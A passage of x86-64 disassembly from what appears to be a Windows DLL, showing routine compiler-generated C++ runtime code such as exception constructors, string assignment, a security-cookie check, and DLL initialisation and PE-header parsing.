   1800016e0:	48 8d 05 21 ec 00 00 	lea    0xec21(%rip),%rax        # 0x180010308
   1800016e7:	48 89 01             	mov    %rax,(%rcx)
   1800016ea:	48 83 c1 08          	add    $0x8,%rcx
   1800016ee:	e9 05 1c 00 00       	jmp    0x1800032f8
   1800016f3:	cc                   	int3
   1800016f4:	cc                   	int3
   1800016f5:	cc                   	int3
   1800016f6:	cc                   	int3
   1800016f7:	cc                   	int3
   1800016f8:	cc                   	int3
   1800016f9:	cc                   	int3
   1800016fa:	cc                   	int3
   1800016fb:	cc                   	int3
   1800016fc:	cc                   	int3
   1800016fd:	cc                   	int3
   1800016fe:	cc                   	int3
   1800016ff:	cc                   	int3
   180001700:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001705:	57                   	push   %rdi
   180001706:	48 83 ec 20          	sub    $0x20,%rsp
   18000170a:	48 8d 05 f7 eb 00 00 	lea    0xebf7(%rip),%rax        # 0x180010308
   180001711:	48 8b f9             	mov    %rcx,%rdi
   180001714:	48 89 01             	mov    %rax,(%rcx)
   180001717:	8b da                	mov    %edx,%ebx
   180001719:	48 83 c1 08          	add    $0x8,%rcx
   18000171d:	e8 d6 1b 00 00       	call   0x1800032f8
   180001722:	f6 c3 01             	test   $0x1,%bl
   180001725:	74 0d                	je     0x180001734
   180001727:	ba 18 00 00 00       	mov    $0x18,%edx
   18000172c:	48 8b cf             	mov    %rdi,%rcx
   18000172f:	e8 2c 07 00 00       	call   0x180001e60
   180001734:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001739:	48 8b c7             	mov    %rdi,%rax
   18000173c:	48 83 c4 20          	add    $0x20,%rsp
   180001740:	5f                   	pop    %rdi
   180001741:	c3                   	ret
   180001742:	cc                   	int3
   180001743:	cc                   	int3
   180001744:	cc                   	int3
   180001745:	cc                   	int3
   180001746:	cc                   	int3
   180001747:	cc                   	int3
   180001748:	cc                   	int3
   180001749:	cc                   	int3
   18000174a:	cc                   	int3
   18000174b:	cc                   	int3
   18000174c:	cc                   	int3
   18000174d:	cc                   	int3
   18000174e:	cc                   	int3
   18000174f:	cc                   	int3
   180001750:	40 53                	rex push %rbx
   180001752:	48 83 ec 20          	sub    $0x20,%rsp
   180001756:	48 8b d9             	mov    %rcx,%rbx
   180001759:	48 8b c2             	mov    %rdx,%rax
   18000175c:	48 8d 0d a5 eb 00 00 	lea    0xeba5(%rip),%rcx        # 0x180010308
   180001763:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001766:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000176a:	48 89 0b             	mov    %rcx,(%rbx)
   18000176d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001771:	0f 11 02             	movups %xmm0,(%rdx)
   180001774:	e8 ef 1a 00 00       	call   0x180003268
   180001779:	48 8d 05 30 ec 00 00 	lea    0xec30(%rip),%rax        # 0x1800103b0
   180001780:	48 89 03             	mov    %rax,(%rbx)
   180001783:	48 8b c3             	mov    %rbx,%rax
   180001786:	48 83 c4 20          	add    $0x20,%rsp
   18000178a:	5b                   	pop    %rbx
   18000178b:	c3                   	ret
   18000178c:	cc                   	int3
   18000178d:	cc                   	int3
   18000178e:	cc                   	int3
   18000178f:	cc                   	int3
   180001790:	40 53                	rex push %rbx
   180001792:	48 83 ec 20          	sub    $0x20,%rsp
   180001796:	48 8b d9             	mov    %rcx,%rbx
   180001799:	48 8b c2             	mov    %rdx,%rax
   18000179c:	48 8d 0d 65 eb 00 00 	lea    0xeb65(%rip),%rcx        # 0x180010308
   1800017a3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800017a6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800017aa:	48 89 0b             	mov    %rcx,(%rbx)
   1800017ad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800017b1:	0f 11 02             	movups %xmm0,(%rdx)
   1800017b4:	e8 af 1a 00 00       	call   0x180003268
   1800017b9:	48 8d 05 60 eb 00 00 	lea    0xeb60(%rip),%rax        # 0x180010320
   1800017c0:	48 89 03             	mov    %rax,(%rbx)
   1800017c3:	48 8b c3             	mov    %rbx,%rax
   1800017c6:	48 83 c4 20          	add    $0x20,%rsp
   1800017ca:	5b                   	pop    %rbx
   1800017cb:	c3                   	ret
   1800017cc:	cc                   	int3
   1800017cd:	cc                   	int3
   1800017ce:	cc                   	int3
   1800017cf:	cc                   	int3
   1800017d0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1800017d4:	48 8d 05 2d 60 01 00 	lea    0x1602d(%rip),%rax        # 0x180017808
   1800017db:	48 85 d2             	test   %rdx,%rdx
   1800017de:	48 0f 45 c2          	cmovne %rdx,%rax
   1800017e2:	c3                   	ret
   1800017e3:	cc                   	int3
   1800017e4:	cc                   	int3
   1800017e5:	cc                   	int3
   1800017e6:	cc                   	int3
   1800017e7:	cc                   	int3
   1800017e8:	cc                   	int3
   1800017e9:	cc                   	int3
   1800017ea:	cc                   	int3
   1800017eb:	cc                   	int3
   1800017ec:	cc                   	int3
   1800017ed:	cc                   	int3
   1800017ee:	cc                   	int3
   1800017ef:	cc                   	int3
   1800017f0:	40 53                	rex push %rbx
   1800017f2:	48 83 ec 20          	sub    $0x20,%rsp
   1800017f6:	48 8b d9             	mov    %rcx,%rbx
   1800017f9:	48 8b c2             	mov    %rdx,%rax
   1800017fc:	48 8d 0d 05 eb 00 00 	lea    0xeb05(%rip),%rcx        # 0x180010308
   180001803:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001806:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000180a:	48 89 0b             	mov    %rcx,(%rbx)
   18000180d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001811:	0f 11 02             	movups %xmm0,(%rdx)
   180001814:	e8 4f 1a 00 00       	call   0x180003268
   180001819:	48 8b c3             	mov    %rbx,%rax
   18000181c:	48 83 c4 20          	add    $0x20,%rsp
   180001820:	5b                   	pop    %rbx
   180001821:	c3                   	ret
   180001822:	cc                   	int3
   180001823:	cc                   	int3
   180001824:	cc                   	int3
   180001825:	cc                   	int3
   180001826:	cc                   	int3
   180001827:	cc                   	int3
   180001828:	cc                   	int3
   180001829:	cc                   	int3
   18000182a:	cc                   	int3
   18000182b:	cc                   	int3
   18000182c:	cc                   	int3
   18000182d:	cc                   	int3
   18000182e:	cc                   	int3
   18000182f:	cc                   	int3
   180001830:	48 83 ec 48          	sub    $0x48,%rsp
   180001834:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001839:	e8 72 fe ff ff       	call   0x1800016b0
   18000183e:	48 8d 15 3b 79 01 00 	lea    0x1793b(%rip),%rdx        # 0x180019180
   180001845:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000184a:	e8 d1 1a 00 00       	call   0x180003320
   18000184f:	cc                   	int3
   180001850:	40 53                	rex push %rbx
   180001852:	56                   	push   %rsi
   180001853:	57                   	push   %rdi
   180001854:	41 56                	push   %r14
   180001856:	41 57                	push   %r15
   180001858:	48 83 ec 20          	sub    $0x20,%rsp
   18000185c:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   180001860:	49 8b f0             	mov    %r8,%rsi
   180001863:	4c 8b fa             	mov    %rdx,%r15
   180001866:	48 8b d9             	mov    %rcx,%rbx
   180001869:	4d 3b c6             	cmp    %r14,%r8
   18000186c:	77 2b                	ja     0x180001899
   18000186e:	48 8b f9             	mov    %rcx,%rdi
   180001871:	49 83 fe 10          	cmp    $0x10,%r14
   180001875:	72 03                	jb     0x18000187a
   180001877:	48 8b 39             	mov    (%rcx),%rdi
   18000187a:	48 89 71 10          	mov    %rsi,0x10(%rcx)
   18000187e:	48 8b cf             	mov    %rdi,%rcx
   180001881:	e8 2a 45 00 00       	call   0x180005db0
   180001886:	48 8b c3             	mov    %rbx,%rax
   180001889:	c6 04 3e 00          	movb   $0x0,(%rsi,%rdi,1)
   18000188d:	48 83 c4 20          	add    $0x20,%rsp
   180001891:	41 5f                	pop    %r15
   180001893:	41 5e                	pop    %r14
   180001895:	5f                   	pop    %rdi
   180001896:	5e                   	pop    %rsi
   180001897:	5b                   	pop    %rbx
   180001898:	c3                   	ret
   180001899:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   1800018a0:	ff ff 7f 
   1800018a3:	48 3b f7             	cmp    %rdi,%rsi
   1800018a6:	0f 87 e9 00 00 00    	ja     0x180001995
   1800018ac:	48 8b ce             	mov    %rsi,%rcx
   1800018af:	48 89 6c 24 68       	mov    %rbp,0x68(%rsp)
   1800018b4:	48 83 c9 0f          	or     $0xf,%rcx
   1800018b8:	48 3b cf             	cmp    %rdi,%rcx
   1800018bb:	77 3a                	ja     0x1800018f7
   1800018bd:	49 8b d6             	mov    %r14,%rdx
   1800018c0:	48 8b c7             	mov    %rdi,%rax
   1800018c3:	48 d1 ea             	shr    $1,%rdx
   1800018c6:	48 2b c2             	sub    %rdx,%rax
   1800018c9:	4c 3b f0             	cmp    %rax,%r14
   1800018cc:	77 29                	ja     0x1800018f7
   1800018ce:	4a 8d 04 32          	lea    (%rdx,%r14,1),%rax
   1800018d2:	48 8b f9             	mov    %rcx,%rdi
   1800018d5:	48 3b c8             	cmp    %rax,%rcx
   1800018d8:	48 0f 42 f8          	cmovb  %rax,%rdi
   1800018dc:	48 8d 47 01          	lea    0x1(%rdi),%rax
   1800018e0:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   1800018e6:	72 35                	jb     0x18000191d
   1800018e8:	48 8d 48 27          	lea    0x27(%rax),%rcx
   1800018ec:	48 3b c8             	cmp    %rax,%rcx
   1800018ef:	0f 86 a6 00 00 00    	jbe    0x18000199b
   1800018f5:	eb 0a                	jmp    0x180001901
   1800018f7:	48 b9 27 00 00 00 00 	movabs $0x8000000000000027,%rcx
   1800018fe:	00 00 80 
   180001901:	e8 62 05 00 00       	call   0x180001e68
   180001906:	48 85 c0             	test   %rax,%rax
   180001909:	0f 84 92 00 00 00    	je     0x1800019a1
   18000190f:	48 8d 68 27          	lea    0x27(%rax),%rbp
   180001913:	48 83 e5 e0          	and    $0xffffffffffffffe0,%rbp
   180001917:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   18000191b:	eb 14                	jmp    0x180001931
   18000191d:	48 85 c0             	test   %rax,%rax
   180001920:	74 0d                	je     0x18000192f
   180001922:	48 8b c8             	mov    %rax,%rcx
   180001925:	e8 3e 05 00 00       	call   0x180001e68
   18000192a:	48 8b e8             	mov    %rax,%rbp
   18000192d:	eb 02                	jmp    0x180001931
   18000192f:	33 ed                	xor    %ebp,%ebp
   180001931:	4c 8b c6             	mov    %rsi,%r8
   180001934:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   180001938:	49 8b d7             	mov    %r15,%rdx
   18000193b:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   18000193f:	48 8b cd             	mov    %rbp,%rcx
   180001942:	e8 69 44 00 00       	call   0x180005db0
   180001947:	c6 04 2e 00          	movb   $0x0,(%rsi,%rbp,1)
   18000194b:	49 83 fe 10          	cmp    $0x10,%r14
   18000194f:	72 2d                	jb     0x18000197e
   180001951:	48 8b 0b             	mov    (%rbx),%rcx
   180001954:	49 8d 56 01          	lea    0x1(%r14),%rdx
   180001958:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000195f:	72 18                	jb     0x180001979
   180001961:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180001965:	48 83 c2 27          	add    $0x27,%rdx
   180001969:	49 2b c8             	sub    %r8,%rcx
   18000196c:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180001970:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001974:	77 2b                	ja     0x1800019a1
   180001976:	49 8b c8             	mov    %r8,%rcx
   180001979:	e8 e2 04 00 00       	call   0x180001e60
   18000197e:	48 89 2b             	mov    %rbp,(%rbx)
   180001981:	48 8b c3             	mov    %rbx,%rax
   180001984:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   180001989:	48 83 c4 20          	add    $0x20,%rsp
   18000198d:	41 5f                	pop    %r15
   18000198f:	41 5e                	pop    %r14
   180001991:	5f                   	pop    %rdi
   180001992:	5e                   	pop    %rsi
   180001993:	5b                   	pop    %rbx
   180001994:	c3                   	ret
   180001995:	e8 f6 fc ff ff       	call   0x180001690
   18000199a:	cc                   	int3
   18000199b:	e8 90 fe ff ff       	call   0x180001830
   1800019a0:	cc                   	int3
   1800019a1:	e8 b6 4c 00 00       	call   0x18000665c
   1800019a6:	cc                   	int3
   1800019a7:	cc                   	int3
   1800019a8:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   1800019ad:	48 8d 05 7c e9 00 00 	lea    0xe97c(%rip),%rax        # 0x180010330
   1800019b4:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800019b8:	48 8d 05 61 e9 00 00 	lea    0xe961(%rip),%rax        # 0x180010320
   1800019bf:	48 89 01             	mov    %rax,(%rcx)
   1800019c2:	48 8b c1             	mov    %rcx,%rax
   1800019c5:	c3                   	ret
   1800019c6:	cc                   	int3
   1800019c7:	cc                   	int3
   1800019c8:	40 53                	rex push %rbx
   1800019ca:	48 83 ec 20          	sub    $0x20,%rsp
   1800019ce:	48 8b d9             	mov    %rcx,%rbx
   1800019d1:	48 8b c2             	mov    %rdx,%rax
   1800019d4:	48 8d 0d 2d e9 00 00 	lea    0xe92d(%rip),%rcx        # 0x180010308
   1800019db:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800019de:	48 89 0b             	mov    %rcx,(%rbx)
   1800019e1:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800019e5:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800019e9:	0f 11 02             	movups %xmm0,(%rdx)
   1800019ec:	e8 77 18 00 00       	call   0x180003268
   1800019f1:	48 8d 05 68 e9 00 00 	lea    0xe968(%rip),%rax        # 0x180010360
   1800019f8:	48 89 03             	mov    %rax,(%rbx)
   1800019fb:	48 8b c3             	mov    %rbx,%rax
   1800019fe:	48 83 c4 20          	add    $0x20,%rsp
   180001a02:	5b                   	pop    %rbx
   180001a03:	c3                   	ret
   180001a04:	40 53                	rex push %rbx
   180001a06:	48 83 ec 30          	sub    $0x30,%rsp
   180001a0a:	48 8b d9             	mov    %rcx,%rbx
   180001a0d:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   180001a12:	48 8b c2             	mov    %rdx,%rax
   180001a15:	48 8d 0d ec e8 00 00 	lea    0xe8ec(%rip),%rcx        # 0x180010308
   180001a1c:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001a1f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001a24:	48 89 0b             	mov    %rcx,(%rbx)
   180001a27:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180001a2b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001a30:	0f 11 02             	movups %xmm0,(%rdx)
   180001a33:	e8 30 18 00 00       	call   0x180003268
   180001a38:	48 8d 05 21 e9 00 00 	lea    0xe921(%rip),%rax        # 0x180010360
   180001a3f:	48 89 03             	mov    %rax,(%rbx)
   180001a42:	48 8b c3             	mov    %rbx,%rax
   180001a45:	48 83 c4 30          	add    $0x30,%rsp
   180001a49:	5b                   	pop    %rbx
   180001a4a:	c3                   	ret
   180001a4b:	cc                   	int3
   180001a4c:	40 53                	rex push %rbx
   180001a4e:	48 83 ec 20          	sub    $0x20,%rsp
   180001a52:	48 8b d9             	mov    %rcx,%rbx
   180001a55:	48 8b c2             	mov    %rdx,%rax
   180001a58:	48 8d 0d a9 e8 00 00 	lea    0xe8a9(%rip),%rcx        # 0x180010308
   180001a5f:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001a62:	48 89 0b             	mov    %rcx,(%rbx)
   180001a65:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180001a69:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001a6d:	0f 11 02             	movups %xmm0,(%rdx)
   180001a70:	e8 f3 17 00 00       	call   0x180003268
   180001a75:	48 8d 05 cc e8 00 00 	lea    0xe8cc(%rip),%rax        # 0x180010348
   180001a7c:	48 89 03             	mov    %rax,(%rbx)
   180001a7f:	48 8b c3             	mov    %rbx,%rax
   180001a82:	48 83 c4 20          	add    $0x20,%rsp
   180001a86:	5b                   	pop    %rbx
   180001a87:	c3                   	ret
   180001a88:	48 83 ec 48          	sub    $0x48,%rsp
   180001a8c:	48 8b d1             	mov    %rcx,%rdx
   180001a8f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001a94:	e8 6b ff ff ff       	call   0x180001a04
   180001a99:	48 8d 15 80 75 01 00 	lea    0x17580(%rip),%rdx        # 0x180019020
   180001aa0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001aa5:	e8 76 18 00 00       	call   0x180003320
   180001aaa:	cc                   	int3
   180001aab:	cc                   	int3
   180001aac:	cc                   	int3
   180001aad:	cc                   	int3
   180001aae:	cc                   	int3
   180001aaf:	cc                   	int3
   180001ab0:	cc                   	int3
   180001ab1:	cc                   	int3
   180001ab2:	cc                   	int3
   180001ab3:	cc                   	int3
   180001ab4:	cc                   	int3
   180001ab5:	cc                   	int3
   180001ab6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180001abd:	00 00 00 
   180001ac0:	48 3b 0d 49 85 01 00 	cmp    0x18549(%rip),%rcx        # 0x18001a010
   180001ac7:	75 10                	jne    0x180001ad9
   180001ac9:	48 c1 c1 10          	rol    $0x10,%rcx
   180001acd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   180001ad2:	75 01                	jne    0x180001ad5
   180001ad4:	c3                   	ret
   180001ad5:	48 c1 c9 10          	ror    $0x10,%rcx
   180001ad9:	e9 86 07 00 00       	jmp    0x180002264
   180001ade:	cc                   	int3
   180001adf:	cc                   	int3
   180001ae0:	48 83 ec 28          	sub    $0x28,%rsp
   180001ae4:	e8 87 0b 00 00       	call   0x180002670
   180001ae9:	85 c0                	test   %eax,%eax
   180001aeb:	74 21                	je     0x180001b0e
   180001aed:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   180001af4:	00 00 
   180001af6:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180001afa:	eb 05                	jmp    0x180001b01
   180001afc:	48 3b c8             	cmp    %rax,%rcx
   180001aff:	74 14                	je     0x180001b15
   180001b01:	33 c0                	xor    %eax,%eax
   180001b03:	f0 48 0f b1 0d fc 8f 	lock cmpxchg %rcx,0x18ffc(%rip)        # 0x18001ab08
   180001b0a:	01 00 
   180001b0c:	75 ee                	jne    0x180001afc
   180001b0e:	32 c0                	xor    %al,%al
   180001b10:	48 83 c4 28          	add    $0x28,%rsp
   180001b14:	c3                   	ret
   180001b15:	b0 01                	mov    $0x1,%al
   180001b17:	eb f7                	jmp    0x180001b10
   180001b19:	cc                   	int3
   180001b1a:	cc                   	int3
   180001b1b:	cc                   	int3
   180001b1c:	48 83 ec 28          	sub    $0x28,%rsp
   180001b20:	e8 4b 0b 00 00       	call   0x180002670
   180001b25:	85 c0                	test   %eax,%eax
   180001b27:	74 07                	je     0x180001b30
   180001b29:	e8 9e 09 00 00       	call   0x1800024cc
   180001b2e:	eb 19                	jmp    0x180001b49
   180001b30:	e8 bb f6 ff ff       	call   0x1800011f0
   180001b35:	8b c8                	mov    %eax,%ecx
   180001b37:	e8 e8 51 00 00       	call   0x180006d24
   180001b3c:	85 c0                	test   %eax,%eax
   180001b3e:	74 04                	je     0x180001b44
   180001b40:	32 c0                	xor    %al,%al
   180001b42:	eb 07                	jmp    0x180001b4b
   180001b44:	e8 8b 55 00 00       	call   0x1800070d4
   180001b49:	b0 01                	mov    $0x1,%al
   180001b4b:	48 83 c4 28          	add    $0x28,%rsp
   180001b4f:	c3                   	ret
   180001b50:	48 83 ec 28          	sub    $0x28,%rsp
   180001b54:	33 c9                	xor    %ecx,%ecx
   180001b56:	e8 3d 01 00 00       	call   0x180001c98
   180001b5b:	84 c0                	test   %al,%al
   180001b5d:	0f 95 c0             	setne  %al
   180001b60:	48 83 c4 28          	add    $0x28,%rsp
   180001b64:	c3                   	ret
   180001b65:	cc                   	int3
   180001b66:	cc                   	int3
   180001b67:	cc                   	int3
   180001b68:	48 83 ec 28          	sub    $0x28,%rsp
   180001b6c:	e8 77 18 00 00       	call   0x1800033e8
   180001b71:	84 c0                	test   %al,%al
   180001b73:	75 04                	jne    0x180001b79
   180001b75:	32 c0                	xor    %al,%al
   180001b77:	eb 12                	jmp    0x180001b8b
   180001b79:	e8 9e 5a 00 00       	call   0x18000761c
   180001b7e:	84 c0                	test   %al,%al
   180001b80:	75 07                	jne    0x180001b89
   180001b82:	e8 75 18 00 00       	call   0x1800033fc
   180001b87:	eb ec                	jmp    0x180001b75
   180001b89:	b0 01                	mov    $0x1,%al
   180001b8b:	48 83 c4 28          	add    $0x28,%rsp
   180001b8f:	c3                   	ret
   180001b90:	48 83 ec 28          	sub    $0x28,%rsp
   180001b94:	e8 97 5a 00 00       	call   0x180007630
   180001b99:	e8 5e 18 00 00       	call   0x1800033fc
   180001b9e:	b0 01                	mov    $0x1,%al
   180001ba0:	48 83 c4 28          	add    $0x28,%rsp
   180001ba4:	c3                   	ret
   180001ba5:	cc                   	int3
   180001ba6:	cc                   	int3
   180001ba7:	cc                   	int3
   180001ba8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001bad:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180001bb2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180001bb7:	57                   	push   %rdi
   180001bb8:	48 83 ec 20          	sub    $0x20,%rsp
   180001bbc:	49 8b f9             	mov    %r9,%rdi
   180001bbf:	49 8b f0             	mov    %r8,%rsi
   180001bc2:	8b da                	mov    %edx,%ebx
   180001bc4:	48 8b e9             	mov    %rcx,%rbp
   180001bc7:	e8 a4 0a 00 00       	call   0x180002670
   180001bcc:	85 c0                	test   %eax,%eax
   180001bce:	75 16                	jne    0x180001be6
   180001bd0:	83 fb 01             	cmp    $0x1,%ebx
   180001bd3:	75 11                	jne    0x180001be6
   180001bd5:	4c 8b c6             	mov    %rsi,%r8
   180001bd8:	33 d2                	xor    %edx,%edx
   180001bda:	48 8b cd             	mov    %rbp,%rcx
   180001bdd:	48 8b c7             	mov    %rdi,%rax
   180001be0:	ff 15 82 e6 00 00    	call   *0xe682(%rip)        # 0x180010268
   180001be6:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   180001beb:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   180001bef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001bf4:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180001bf9:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180001bfe:	48 83 c4 20          	add    $0x20,%rsp
   180001c02:	5f                   	pop    %rdi
   180001c03:	e9 cc 4a 00 00       	jmp    0x1800066d4
   180001c08:	48 83 ec 28          	sub    $0x28,%rsp
   180001c0c:	e8 5f 0a 00 00       	call   0x180002670
   180001c11:	85 c0                	test   %eax,%eax
   180001c13:	74 10                	je     0x180001c25
   180001c15:	48 8d 0d fc 8e 01 00 	lea    0x18efc(%rip),%rcx        # 0x18001ab18
   180001c1c:	48 83 c4 28          	add    $0x28,%rsp
   180001c20:	e9 07 58 00 00       	jmp    0x18000742c
   180001c25:	e8 d2 4e 00 00       	call   0x180006afc
   180001c2a:	85 c0                	test   %eax,%eax
   180001c2c:	75 05                	jne    0x180001c33
   180001c2e:	e8 ad 4e 00 00       	call   0x180006ae0
   180001c33:	48 83 c4 28          	add    $0x28,%rsp
   180001c37:	c3                   	ret
   180001c38:	48 83 ec 28          	sub    $0x28,%rsp
   180001c3c:	33 c9                	xor    %ecx,%ecx
   180001c3e:	e8 35 5a 00 00       	call   0x180007678
   180001c43:	48 83 c4 28          	add    $0x28,%rsp
   180001c47:	e9 e0 17 00 00       	jmp    0x18000342c
   180001c4c:	40 53                	rex push %rbx
   180001c4e:	48 83 ec 20          	sub    $0x20,%rsp
   180001c52:	0f b6 05 b7 8e 01 00 	movzbl 0x18eb7(%rip),%eax        # 0x18001ab10
   180001c59:	85 c9                	test   %ecx,%ecx
   180001c5b:	bb 01 00 00 00       	mov    $0x1,%ebx
   180001c60:	0f 44 c3             	cmove  %ebx,%eax
   180001c63:	88 05 a7 8e 01 00    	mov    %al,0x18ea7(%rip)        # 0x18001ab10
   180001c69:	e8 5e 08 00 00       	call   0x1800024cc
   180001c6e:	e8 4d 17 00 00       	call   0x1800033c0
   180001c73:	84 c0                	test   %al,%al
   180001c75:	75 04                	jne    0x180001c7b
   180001c77:	32 c0                	xor    %al,%al
   180001c79:	eb 14                	jmp    0x180001c8f
   180001c7b:	e8 88 59 00 00       	call   0x180007608
   180001c80:	84 c0                	test   %al,%al
   180001c82:	75 09                	jne    0x180001c8d
   180001c84:	33 c9                	xor    %ecx,%ecx
   180001c86:	e8 85 17 00 00       	call   0x180003410
   180001c8b:	eb ea                	jmp    0x180001c77
   180001c8d:	8a c3                	mov    %bl,%al
   180001c8f:	48 83 c4 20          	add    $0x20,%rsp
   180001c93:	5b                   	pop    %rbx
   180001c94:	c3                   	ret
   180001c95:	cc                   	int3
   180001c96:	cc                   	int3
   180001c97:	cc                   	int3
   180001c98:	40 53                	rex push %rbx
   180001c9a:	48 83 ec 20          	sub    $0x20,%rsp
   180001c9e:	80 3d 6c 8e 01 00 00 	cmpb   $0x0,0x18e6c(%rip)        # 0x18001ab11
   180001ca5:	8b d9                	mov    %ecx,%ebx
   180001ca7:	75 67                	jne    0x180001d10
   180001ca9:	83 f9 01             	cmp    $0x1,%ecx
   180001cac:	77 6a                	ja     0x180001d18
   180001cae:	e8 bd 09 00 00       	call   0x180002670
   180001cb3:	85 c0                	test   %eax,%eax
   180001cb5:	74 28                	je     0x180001cdf
   180001cb7:	85 db                	test   %ebx,%ebx
   180001cb9:	75 24                	jne    0x180001cdf
   180001cbb:	48 8d 0d 56 8e 01 00 	lea    0x18e56(%rip),%rcx        # 0x18001ab18
   180001cc2:	e8 a1 57 00 00       	call   0x180007468
   180001cc7:	85 c0                	test   %eax,%eax
   180001cc9:	75 10                	jne    0x180001cdb
   180001ccb:	48 8d 0d 5e 8e 01 00 	lea    0x18e5e(%rip),%rcx        # 0x18001ab30
   180001cd2:	e8 91 57 00 00       	call   0x180007468
   180001cd7:	85 c0                	test   %eax,%eax
   180001cd9:	74 2e                	je     0x180001d09
   180001cdb:	32 c0                	xor    %al,%al
   180001cdd:	eb 33                	jmp    0x180001d12
   180001cdf:	66 0f 6f 05 89 e6 00 	movdqa 0xe689(%rip),%xmm0        # 0x180010370
   180001ce6:	00 
   180001ce7:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180001ceb:	f3 0f 7f 05 25 8e 01 	movdqu %xmm0,0x18e25(%rip)        # 0x18001ab18
   180001cf2:	00 
   180001cf3:	48 89 05 2e 8e 01 00 	mov    %rax,0x18e2e(%rip)        # 0x18001ab28
   180001cfa:	f3 0f 7f 05 2e 8e 01 	movdqu %xmm0,0x18e2e(%rip)        # 0x18001ab30
   180001d01:	00 
   180001d02:	48 89 05 37 8e 01 00 	mov    %rax,0x18e37(%rip)        # 0x18001ab40
   180001d09:	c6 05 01 8e 01 00 01 	movb   $0x1,0x18e01(%rip)        # 0x18001ab11
   180001d10:	b0 01                	mov    $0x1,%al
   180001d12:	48 83 c4 20          	add    $0x20,%rsp
   180001d16:	5b                   	pop    %rbx
   180001d17:	c3                   	ret
   180001d18:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001d1d:	e8 62 09 00 00       	call   0x180002684
   180001d22:	cc                   	int3
   180001d23:	cc                   	int3
   180001d24:	48 83 ec 18          	sub    $0x18,%rsp
   180001d28:	4c 8b c1             	mov    %rcx,%r8
   180001d2b:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180001d30:	66 39 05 c9 e2 ff ff 	cmp    %ax,-0x1d37(%rip)        # 0x180000000
   180001d37:	75 78                	jne    0x180001db1
   180001d39:	48 63 0d fc e2 ff ff 	movslq -0x1d04(%rip),%rcx        # 0x18000003c
   180001d40:	48 8d 15 b9 e2 ff ff 	lea    -0x1d47(%rip),%rdx        # 0x180000000
   180001d47:	48 03 ca             	add    %rdx,%rcx
   180001d4a:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180001d50:	75 5f                	jne    0x180001db1
   180001d52:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180001d57:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001d5b:	75 54                	jne    0x180001db1
   180001d5d:	4c 2b c2             	sub    %rdx,%r8
   180001d60:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   180001d64:	48 8d 51 18          	lea    0x18(%rcx),%rdx
   180001d68:	48 03 d0             	add    %rax,%rdx
   180001d6b:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   180001d6f:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180001d73:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   180001d77:	48 89 14 24          	mov    %rdx,(%rsp)
   180001d7b:	49 3b d1             	cmp    %r9,%rdx
   180001d7e:	74 18                	je     0x180001d98
   180001d80:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180001d83:	4c 3b c1             	cmp    %rcx,%r8
   180001d86:	72 0a                	jb     0x180001d92
   180001d88:	8b 42 08             	mov    0x8(%rdx),%eax
   180001d8b:	03 c1                	add    %ecx,%eax
   180001d8d:	4c 3b c0             	cmp    %rax,%r8
   180001d90:	72 08                	jb     0x180001d9a
